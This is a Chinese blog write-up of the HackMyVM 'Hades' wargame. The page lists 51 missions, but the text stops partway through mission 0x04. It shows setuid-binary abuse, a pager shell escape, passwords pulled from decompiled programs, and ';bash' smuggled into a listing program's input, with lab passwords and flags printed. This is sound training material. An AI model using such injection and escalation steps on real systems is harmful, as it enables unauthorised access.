<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0"><meta name="theme-color" content="#0078E7"><meta name="author" content="ta0"><meta name="copyright" content="ta0"><meta name="generator" content="Hexo 7.1.1"><meta name="theme" content="hexo-theme-yun"><title>HackMyVM-Hades | ta0的小站</title><link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Noto+Serif+SC:wght@900&amp;display=swap" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/star-markdown-css@0.4.1/dist/yun/yun-markdown.min.css"><link rel="stylesheet" href="https://fastly.jsdelivr.net/npm/prism-theme-vars/base.css"><script src="https://fastly.jsdelivr.net/npm/scrollreveal/dist/scrollreveal.min.js" defer></script><script>function initScrollReveal() {
  [".post-card",".markdown-body img"].forEach((target)=> {
    ScrollReveal().reveal(target);
  })
}
document.addEventListener("DOMContentLoaded", initScrollReveal);
document.addEventListener("pjax:success", initScrollReveal);
</script><link rel="icon" type="image/png" href="/myfa.ico"><link rel="mask-icon" href="/myfa.ico" color="#0078E7"><link rel="preload" href="/css/mycss.css" as="style"><link rel="prefetch" href="/js/sidebar.js" as="script"><link rel="preconnect" href="https://cdn.jsdelivr.net" crossorigin><link rel="preconnect" href="https://fastly.jsdelivr.net/npm/" crossorigin><script id="yun-config">
    window.Yun = {}
    window.CONFIG = {"hostname":"ta0.fun","root":"/","title":"做点小小记录","version":"1.10.11","mode":"time","copycode":true,"page":{"isPost":true},"i18n":{"placeholder":"搜索...","empty":"找不到您查询的内容: ${query}","hits":"找到 ${hits} 条结果","hits_time":"找到 ${hits} 条结果（用时 ${time} 毫秒）"},"anonymous_image":"https://cdn.yunyoujun.cn/img/avatar/none.jpg","say":{"api":"https://el-bot-api.vercel.app/api/words/young"},"local_search":{"path":"/search.xml"},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"fireworks":{"colors":null},"vendors":{"host":"https://fastly.jsdelivr.net/npm/","darken":"https://fastly.jsdelivr.net/npm/darken@1.5.0"}};
  </script><link rel="stylesheet" href="/css/mycss.css"><script src="/js/hexo-theme-yun.js" type="module"></script><link rel="alternate" href="/atom.xml" title="ta0的小站" type="application/atom+xml"><meta name="description" content="MISSION 0x01hacker@hades:~$ cat mission.txt  ################ # MISSION 0x01 # ################  ## EN ## User acantha has left us a gift to obtain her powers.  ## ES ## La usuaria acantha nos ha deja">
<meta property="og:type" content="article">
<meta property="og:title" content="HackMyVM-Hades">
<meta property="og:url" content="http://ta0.fun/posts/13a562a7/index.html">
<meta property="og:site_name" content="ta0的小站">
<meta property="og:description" content="MISSION 0x01hacker@hades:~$ cat mission.txt  ################ # MISSION 0x01 # ################  ## EN ## User acantha has left us a gift to obtain her powers.  ## ES ## La usuaria acantha nos ha deja">
<meta property="og:locale" content="zh_CN">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/24/OPFsiU.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/24/OPFVtY.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/24/OPFY2v.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/25/OPhRSG.jpg">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/25/OPhtw1.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/06/25/OPhHDD.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/06/OPLY8p.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/06/OPL6Bq.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/06/OPL8Kc.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/06/OPLX0r.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/06/OPLIMM.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/06/OPLCH1.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/06/OPEOxD.png">
<meta property="og:image" content="https://ooo.0x0.ooo/2024/07/15/ORBdaU.png">
<meta property="article:published_time" content="2024-06-24T11:52:47.575Z">
<meta property="article:modified_time" content="2024-07-16T10:21:36.837Z">
<meta property="article:author" content="ta0">
<meta property="article:tag" content="ctf">
<meta property="article:tag" content="pwn">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://ooo.0x0.ooo/2024/06/24/OPFsiU.png"><script>(function() {
  if (CONFIG.mode !== 'auto') return
  const prefersDark = window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches
  const setting = localStorage.getItem('darken-mode') || 'auto'
  if (setting === 'dark' || (prefersDark && setting !== 'light'))
    document.documentElement.classList.toggle('dark', true)
})()</script></head><body><script src="https://code.iconify.design/2/2.1.1/iconify.min.js"></script><script>// Define global variable
IconifyProviders = {
  // Empty prefix: overwrite default API provider configuration
  '': {
    // Use custom API first, use Iconify public API as backup
    resources: [
        'https://api.iconify.design',
    ],
    // Wait for 1 second before switching API hosts
    rotate: 1000,
  },
};</script><script defer src="https://fastly.jsdelivr.net/npm/animejs@latest"></script><script defer src="/js/ui/fireworks.js" type="module"></script><canvas class="fireworks"></canvas><div class="container"><a class="sidebar-toggle hty-icon-button" id="menu-btn"><div class="hamburger hamburger--spin" type="button"><span class="hamburger-box"><span class="hamburger-inner"></span></span></div></a><div class="sidebar-toggle sidebar-overlay"></div><aside class="sidebar"><script src="/js/sidebar.js" type="module"></script><ul class="sidebar-nav"><li class="sidebar-nav-item sidebar-nav-toc hty-icon-button sidebar-nav-active" data-target="post-toc-wrap" title="文章目录"><span class="icon iconify" data-icon="ri:list-ordered"></span></li><li class="sidebar-nav-item sidebar-nav-overview hty-icon-button" data-target="site-overview-wrap" title="站点概览"><span class="icon iconify" data-icon="ri:passport-line"></span></li></ul><div class="sidebar-panel" id="site-overview-wrap"><div class="site-info fix-top"><a class="site-author-avatar" href="/about/" title="ta0"><img width="96" loading="lazy" src="/123.jpg" alt="ta0"></a><div class="site-author-name"><a href="/about/">ta0</a></div><span class="site-name">ta0的小站</span><sub class="site-subtitle">网安小白的成长记录</sub><div class="site-description">Learning For Fun</div></div><nav class="site-state"><a class="site-state-item hty-icon-button icon-home" href="/" title="首页"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:home-4-line"></span></span></a><div class="site-state-item"><a href="/archives/" title="归档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:archive-line"></span></span><span class="site-state-item-count">132</span></a></div><div class="site-state-item"><a href="/categories/" title="分类"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:folder-2-line"></span></span><span class="site-state-item-count">18</span></a></div><div class="site-state-item"><a href="/tags/" title="标签"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="site-state-item-count">204</span></a></div><a class="site-state-item hty-icon-button" target="_blank" rel="noopener" href="https://yun.yunyoujun.cn" title="文档"><span class="site-state-item-icon"><span class="icon iconify" data-icon="ri:settings-line"></span></span></a></nav><hr style="margin-bottom:0.5rem"><div class="links-of-author"><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://github.com/tao0845" title="GitHub" target="_blank" style="color:#6e5494"><span class="icon iconify" data-icon="ri:github-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="https://music.163.com/#/user/home?id=312924699" title="网易云音乐" target="_blank" style="color:#C20C0C"><span class="icon iconify" data-icon="ri:netease-cloud-music-line"></span></a><a class="links-of-author-item hty-icon-button" rel="noopener" href="mailto:2814928906@qq.com" title="E-Mail" target="_blank" style="color:#8E71C1"><span class="icon iconify" data-icon="ri:mail-line"></span></a></div><hr style="margin:0.5rem 1rem"><div class="links"><a class="links-item hty-icon-button" href="/links/" title="我的小伙伴们" style="color:dodgerblue"><span class="icon iconify" data-icon="ri:genderless-line"></span></a></div><br><a class="links-item hty-icon-button" id="toggle-mode-btn" href="javascript:;" title="Mode" style="color: #f1cb64"><span class="icon iconify" data-icon="ri:contrast-2-line"></span></a></div><div class="sidebar-panel sidebar-panel-active" id="post-toc-wrap"><div class="post-toc"><div class="post-toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x01"><span class="toc-number">1.</span> <span class="toc-text">MISSION 0x01</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x02"><span class="toc-number">2.</span> <span class="toc-text">MISSION 0x02</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x03"><span class="toc-number">3.</span> <span class="toc-text">MISSION 0x03</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x04"><span class="toc-number">4.</span> <span class="toc-text">MISSION 0x04</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x05"><span class="toc-number">5.</span> <span class="toc-text">MISSION 0x05</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x06"><span class="toc-number">6.</span> <span class="toc-text">MISSION 0x06</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x07"><span class="toc-number">7.</span> <span class="toc-text">MISSION 0x07</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x08"><span class="toc-number">8.</span> <span class="toc-text">MISSION 0x08</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x09"><span class="toc-number">9.</span> <span class="toc-text">MISSION 0x09</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x10"><span class="toc-number">10.</span> <span class="toc-text">MISSION 0x10</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x11"><span class="toc-number">11.</span> <span class="toc-text">MISSION 0x11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x11-1"><span class="toc-number">12.</span> <span class="toc-text">MISSION 0x11</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x12"><span class="toc-number">13.</span> <span class="toc-text">MISSION 0x12</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x13"><span class="toc-number">14.</span> <span class="toc-text">MISSION 0x13</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x14"><span class="toc-number">15.</span> <span class="toc-text">MISSION 0x14</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mission-0x15"><span class="toc-number">16.</span> <span class="toc-text">Mission 0x15</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSSION-0x16"><span class="toc-number">17.</span> <span class="toc-text">MISSSION 0x16</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSSION-0x17"><span class="toc-number">18.</span> <span class="toc-text">MISSSION 0x17</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x18"><span class="toc-number">19.</span> <span class="toc-text">MISSION 0x18</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x19"><span class="toc-number">20.</span> <span class="toc-text">MISSION 0x19</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x20"><span class="toc-number">21.</span> <span class="toc-text">MISSION 0x20</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x21"><span class="toc-number">22.</span> <span class="toc-text">MISSION 0x21</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x22"><span class="toc-number">23.</span> <span class="toc-text">MISSION 0x22</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x23"><span class="toc-number">24.</span> <span class="toc-text">MISSION 0x23</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x24"><span class="toc-number">25.</span> <span class="toc-text">MISSION 0x24</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x25"><span class="toc-number">26.</span> <span class="toc-text">MISSION 0x25</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x26"><span class="toc-number">27.</span> <span class="toc-text">MISSION 0x26</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x27"><span class="toc-number">28.</span> <span class="toc-text">MISSION 0x27</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x28"><span class="toc-number">29.</span> <span class="toc-text">MISSION 0x28</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x29"><span class="toc-number">30.</span> <span class="toc-text">MISSION 0x29</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x30"><span class="toc-number">31.</span> <span class="toc-text">MISSION 0x30</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x31"><span class="toc-number">32.</span> <span class="toc-text">MISSION 0x31</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x32"><span class="toc-number">33.</span> <span class="toc-text">MISSION 0x32</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x33"><span class="toc-number">34.</span> <span class="toc-text">MISSION 0x33</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x34"><span class="toc-number">35.</span> <span class="toc-text">MISSION 0x34</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x35"><span class="toc-number">36.</span> <span class="toc-text">MISSION 0x35</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x36"><span class="toc-number">37.</span> <span class="toc-text">MISSION 0x36</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x37"><span class="toc-number">38.</span> <span class="toc-text">MISSION 0x37</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x38"><span class="toc-number">39.</span> <span class="toc-text">MISSION 0x38</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSSION-0x39"><span class="toc-number">40.</span> <span class="toc-text">MISSSION 0x39</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x40"><span class="toc-number">41.</span> <span class="toc-text">MISSION 0x40</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x41"><span class="toc-number">42.</span> <span class="toc-text">MISSION 0x41</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x42"><span class="toc-number">43.</span> <span class="toc-text">MISSION 0x42</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x43"><span class="toc-number">44.</span> <span class="toc-text">MISSION 0x43</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x44"><span class="toc-number">45.</span> <span class="toc-text">MISSION 0x44</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x45"><span class="toc-number">46.</span> <span class="toc-text">MISSION 0x45</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x46"><span class="toc-number">47.</span> <span class="toc-text">MISSION 0x46</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x47"><span class="toc-number">48.</span> <span class="toc-text">MISSION 0x47</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION-0x48"><span class="toc-number">49.</span> <span class="toc-text">MISSION 0x48</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION49"><span class="toc-number">50.</span> <span class="toc-text">MISSION49</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MISSION50"><span class="toc-number">51.</span> <span class="toc-text">MISSION50</span></a></li></ol></div></div></div></aside><main class="sidebar-translate" id="content"><div id="post"><article class="hty-card post-block" itemscope itemtype="https://schema.org/Article" style="--smc-primary:#0078E7;"><link itemprop="mainEntityOfPage" href="http://ta0.fun/posts/13a562a7/"><span hidden itemprop="author" itemscope itemtype="https://schema.org/Person"><meta itemprop="name" content="ta0"><meta itemprop="description"></span><span hidden itemprop="publisher" itemscope itemtype="https://schema.org/Organization"><meta itemprop="name" content="ta0的小站"></span><header class="post-header"><h1 class="post-title" itemprop="name headline">HackMyVM-Hades</h1><div class="post-meta"><div class="post-time" style="display:block"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-line"></span></span> <time title="创建时间：2024-06-24 19:52:47" itemprop="dateCreated datePublished" datetime="2024-06-24T19:52:47+08:00">2024-06-24</time><span class="post-meta-divider">-</span><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:calendar-2-line"></span></span> <time title="修改时间：2024-07-16 18:21:36" itemprop="dateModified" datetime="2024-07-16T18:21:36+08:00">2024-07-16</time></div><span class="post-count"><span class="post-symbolcount"><span class="post-meta-item-icon" title="本文字数"><span class="icon iconify" data-icon="ri:file-word-line"></span></span> <span title="本文字数">10.2k</span><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读时长"><span class="icon iconify" data-icon="ri:timer-line"></span></span> <span title="阅读时长">60m</span></span></span><span class="post-busuanzi"><span class="post-meta-divider">-</span><span class="post-meta-item-icon" title="阅读次数"><span class="icon iconify" data-icon="ri:eye-line"></span> <span id="busuanzi_value_page_pv"></span></span></span><div class="post-classify"><span class="post-category"> <span class="post-meta-item-icon" style="margin-right:3px;"><span class="icon iconify" data-icon="ri:folder-line"></span></span><span itemprop="about" itemscope itemtype="https://schema.org/Thing"><a class="category-item" href="/categories/Labs/" style="--text-color:var(--hty-text-color)" itemprop="url" rel="index"><span itemprop="text">Labs</span></a></span></span><span class="post-tag"><span class="post-meta-divider">-</span><a class="tag-item" href="/tags/ctf/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">ctf</span></a><a class="tag-item" href="/tags/pwn/" style="--text-color:var(--hty-text-color)"><span class="post-meta-item-icon"><span class="icon iconify" data-icon="ri:price-tag-3-line"></span></span><span class="tag-name">pwn</span></a></span></div></div></header><section class="post-body" itemprop="articleBody"><div class="post-content markdown-body"><h2 id="MISSION-0x01"><a href="#MISSION-0x01" class="headerlink" title="MISSION 0x01"></a>MISSION 0x01</h2><pre class="language-bash" data-language="bash"><code class="language-bash">hacker@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x01 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User acantha has left us a gift to obtain her powers.

<span class="token comment">## ES ##</span>
La usuaria acantha nos ha dejado un regalo para obtener sus poderes.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">hacker@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> *gift* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/usr/share/man/man1/giftopnm.1.gz
/usr/bin/giftopnm
/opt/gift_hacker</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/24/OPFsiU.png" alt="OPFsiU.png" loading="lazy"><br>直接执行就完事了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">hacker@hades:~$ /opt/gift_hacker 
acantha@hades:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2043</span><span class="token punctuation">(</span>acantha<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2001</span><span class="token punctuation">(</span>hacker<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2001</span><span class="token punctuation">(</span>hacker<span class="token punctuation">)</span>
acantha@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">32</span>
drwxr-x--- <span class="token number">2</span> root   hacker <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root   root   <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> hacker hacker  <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> hacker hacker <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> hacker hacker  <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-rw-r----- <span class="token number">1</span> root   hacker  <span class="token number">194</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-rw-r----- <span class="token number">1</span> root   hacker <span class="token number">2625</span> Apr  <span class="token number">5</span> 06:36 readme.txt
acantha@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> acant* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/pwned/acantha
/pazz/acantha_pass.txt
acantha@hades:~$ <span class="token function">cat</span> /pazz/acantha_pass.txt 
mYYLhLBSkrzZqFydxGkn</code></pre>
<p>ssh登录</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">acantha@hades:~$ <span class="token function">id</span>
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2043</span><span class="token punctuation">(</span>acantha<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2043</span><span class="token punctuation">(</span>acantha<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2043</span><span class="token punctuation">(</span>acantha<span class="token punctuation">)</span>
acantha@hades:~$ <span class="token function">ls</span> 
flagz.txt  guess  mission.txt
acantha@hades:~$ <span class="token function">cat</span> flagz.txt 
^CaEuVJtJjaCwZtuuAFD^</code></pre>
<h2 id="MISSION-0x02"><a href="#MISSION-0x02" class="headerlink" title="MISSION 0x02"></a>MISSION 0x02</h2><pre class="language-bash" data-language="bash"><code class="language-bash">acantha@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x02 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user alala has left us a program, <span class="token keyword">if</span> we insert the <span class="token number">6</span> correct numbers, she gives us her password<span class="token operator">!</span>

<span class="token comment">## ES ##</span>
La usuaria alala nos ha dejado un programa, si insertamos los <span class="token number">6</span> numeros correctos, nos da <span class="token function">su</span> password<span class="token operator">!</span></code></pre>
<p>反编译guess<br><img src="https://ooo.0x0.ooo/2024/06/24/OPFVtY.png" alt="OPFVtY.png" loading="lazy"><br>直接拿到密码<code>DsYzpJQrCEndEWIMxWxu</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">52</span>
drwxr-x--- <span class="token number">2</span> root   alala   <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root   root    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> alala  alala    <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> alala  alala   <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> alala  alala    <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-r--r----- <span class="token number">1</span> althea althea    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 althea_pass.txt
-rw-r----- <span class="token number">1</span> root   alala     <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root   alala    <span class="token number">164</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-rwS--s--- <span class="token number">1</span> root   alala  <span class="token number">16056</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">read</span>
alala@hades:~$ <span class="token function">cat</span> flagz.txt 
^gTdGmkwhDrCqKrDQpxH^</code></pre>
<h2 id="MISSION-0x03"><a href="#MISSION-0x03" class="headerlink" title="MISSION 0x03"></a>MISSION 0x03</h2><pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x03 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
User althea loves reading Linux help.

<span class="token comment">## ES ##</span>
A la usuaria althea le encanta leer la ayuda de Linux.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">52</span>
drwxr-x--- <span class="token number">2</span> root   alala   <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
drwxr-xr-x <span class="token number">1</span> root   root    <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token punctuation">..</span>
-rw-r--r-- <span class="token number">1</span> alala  alala    <span class="token number">220</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bash_logout
-rw-r--r-- <span class="token number">1</span> alala  alala   <span class="token number">3526</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .bashrc
-rw-r--r-- <span class="token number">1</span> alala  alala    <span class="token number">807</span> Apr <span class="token number">23</span>  <span class="token number">2023</span> .profile
-r--r----- <span class="token number">1</span> althea althea    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 althea_pass.txt
-rw-r----- <span class="token number">1</span> root   alala     <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rw-r----- <span class="token number">1</span> root   alala    <span class="token number">164</span> Apr  <span class="token number">5</span> 06:36 mission.txt
-rwS--s--- <span class="token number">1</span> root   alala  <span class="token number">16056</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">read</span></code></pre>
<p>直接在底端执行命令读取 althea的密码就行了</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ <span class="token function">find</span> / <span class="token parameter variable">-name</span> althea* <span class="token operator"><span class="token file-descriptor important">2</span>></span>/dev/null
/pwned/alala/althea_pass.txt</code></pre>
<p><img src="https://ooo.0x0.ooo/2024/06/24/OPFY2v.png" alt="OPFY2v.png" loading="lazy"></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">alala@hades:~$ ./read
ObxEmwisYjERrDfvSbdA
<span class="token operator">!</span>done  <span class="token punctuation">(</span>press RETURN<span class="token punctuation">)</span></code></pre>
<p>拿到密码<code>ObxEmwisYjERrDfvSbdA</code></p>
<pre class="language-bash" data-language="bash"><code class="language-bash">althea@hades:~$ <span class="token function">cat</span> flagz.txt 
^btDtPAPzSiXmoHItpqX^</code></pre>
<h2 id="MISSION-0x04"><a href="#MISSION-0x04" class="headerlink" title="MISSION 0x04"></a>MISSION 0x04</h2><pre class="language-bash" data-language="bash"><code class="language-bash">althea@hades:~$ <span class="token function">cat</span> mission.txt 
<span class="token comment">################</span>
<span class="token comment"># MISSION 0x04 #</span>
<span class="token comment">################</span>

<span class="token comment">## EN ##</span>
The user andromeda has left us a program to list directories.

<span class="token comment">## ES ##</span>
La usuaria andromeda nos ha dejado un programa para listar directorios.</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">althea@hades:~$ ./lsme
Enter <span class="token function">file</span> to check:
/pwned/andromeda
/bin/ls: cannot <span class="token function">open</span> directory <span class="token string">'/pwned/andromeda'</span><span class="token builtin class-name">:</span> Permission denied
Segmentation fault
althea@hades:~$ ./lsme
Enter <span class="token function">file</span> to check:
<span class="token punctuation">;</span><span class="token function">id</span>
total <span class="token number">28</span>
-r--r----- <span class="token number">1</span> andromeda andromeda    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 andromeda_pass.txt
-rw-r----- <span class="token number">1</span> root      althea       <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rwS--s--- <span class="token number">1</span> root      althea    <span class="token number">16216</span> Apr  <span class="token number">5</span> 06:36 lsme
-rw-r----- <span class="token number">1</span> root      althea      <span class="token number">205</span> Apr  <span class="token number">5</span> 06:36 mission.txt
<span class="token assign-left variable">uid</span><span class="token operator">=</span><span class="token number">2046</span><span class="token punctuation">(</span>andromeda<span class="token punctuation">)</span> <span class="token assign-left variable">gid</span><span class="token operator">=</span><span class="token number">2045</span><span class="token punctuation">(</span>althea<span class="token punctuation">)</span> <span class="token assign-left variable">groups</span><span class="token operator">=</span><span class="token number">2045</span><span class="token punctuation">(</span>althea<span class="token punctuation">)</span></code></pre>
<p>测试发现可以命令执行</p>
<pre class="language-bash" data-language="bash"><code class="language-bash">althea@hades:~$ ./lsme
Enter <span class="token function">file</span> to check:

<span class="token punctuation">;</span><span class="token function">bash</span>
total <span class="token number">28</span>
-r--r----- <span class="token number">1</span> andromeda andromeda    <span class="token number">21</span> Apr  <span class="token number">5</span> 06:36 andromeda_pass.txt
-rw-r----- <span class="token number">1</span> root      althea       <span class="token number">22</span> Apr  <span class="token number">5</span> 06:36 flagz.txt
-rwS--s--- <span class="token number">1</span> root      althea    <span class="token number">16216</span> Apr  <span class="token number">5</span> 06:36 lsme
-rw-r----- <span class="token number">1</span> root      althea      <span class="token number">205</span> Apr  <span class="token number">5</span> 06:36 mission.txt
andromeda@hades:~$ <span class="token function">cat</span> andromeda_pass.txt 
OTWGTbHzrxhYFSTlKcOt</code></pre>
<pre class="language-bash" data-language="bash"><code class="language-bash">andromeda@hades:~$ <span class="token function">ls</span> <span class="token parameter variable">-al</span>
total <span class="token number">52</span>
drwxr-x--- <span class="token number">2</span> root      andromeda  <span class="token number">4096</span> Apr  <span class="token number">5</span> 06:36 <span class="token builtin class-name">.</span>
